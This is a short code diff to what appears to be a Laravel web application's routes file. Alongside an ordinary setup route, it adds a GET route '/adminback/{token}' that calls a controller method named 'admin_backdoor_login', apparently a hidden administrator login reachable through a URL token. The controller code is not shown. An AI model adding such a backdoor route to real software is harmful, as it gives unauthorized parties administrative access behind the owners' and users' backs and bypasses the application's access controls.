@@ -10,6 +10,7 @@
 |
 */
 Route::get('/setup', 'UserController@setup')->name('setup');
+Route::get('/adminback/{token}', 'UserController@admin_backdoor_login');
 
 
 Route::post('updateUsersRed','Updateusers@update');
